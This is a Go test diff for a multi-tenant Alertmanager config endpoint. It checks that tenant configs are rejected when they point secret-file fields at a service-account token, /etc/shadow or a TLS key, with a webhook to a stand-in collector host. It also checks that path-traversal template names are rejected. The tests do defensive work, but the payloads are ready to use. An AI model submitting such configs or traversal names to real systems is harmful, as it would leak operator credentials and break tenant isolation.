@@ -396,3 +396,83 @@ func Test_SetConfig_ValidateTemplateFiles(t *testing.T) {
 	err := validateTemplateFiles(cfg)
 	assert.Equal(t, nil, err)
 }
+
+func Test_SetConfig_RejectsAlertmanagerConfigWithFileSecretSources(t *testing.T) {
+	// A tenant must not be able to make the Alertmanager process read
+	// operator-side files such as a Kubernetes service-account token by
+	// pointing *_file receiver fields at them.
+	setup(t)
+	defer cleanup(t)
+
+	tests := []struct {
+		name   string
+		config string
+	}{
+		{
+			name: "bearer_token_file",
+			config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/collect
+            http_config:
+              bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token`,
+		},
+		{
+			name: "basic_auth.password_file",
+			config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: http://example.invalid/collect
+            http_config:
+              basic_auth:
+                username: user
+                password_file: /etc/shadow`,
+		},
+		{
+			name: "tls_config.key_file",
+			config: `
+        route:
+          receiver: exfil
+        receivers:
+        - name: exfil
+          webhook_configs:
+          - url: https://example.invalid/collect
+            http_config:
+              tls_config:
+                key_file: /tls/key`,
+		},
+	}
+
+	userID := makeUserID()
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			cfg := userconfig.Config{AlertmanagerConfig: tc.config, RulesConfig: userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2}}
+			resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))
+			assert.Equal(t, http.StatusBadRequest, resp.Code, resp.Body.String())
+		})
+	}
+}
+
+func Test_SetConfig_RejectsTemplateFilenameWithPath(t *testing.T) {
+	// A tenant must not be able to escape its per-tenant templates directory
+	// via a template_files map key containing a path separator or relative
+	// traversal.
+	setup(t)
+	defer cleanup(t)
+
+	userID := makeUserID()
+	for _, badName := range []string{"../templates-evil/x.tmpl", "sub/x.tmpl", "/abs/x.tmpl"} {
+		cfg := userconfig.Config{
+			RulesConfig:   userconfig.RulesConfig{FormatVersion: userconfig.RuleFormatV2},
+			TemplateFiles: map[string]string{badName: "{{ 1 }}"},
+		}
+		resp := requestAsUser(t, userID, "POST", "/api/prom/configs/alertmanager", "", readerFromConfig(t, cfg))
+		assert.Equal(t, http.StatusBadRequest, resp.Code, "name=%q body=%s", badName, resp.Body.String())
+	}
+}
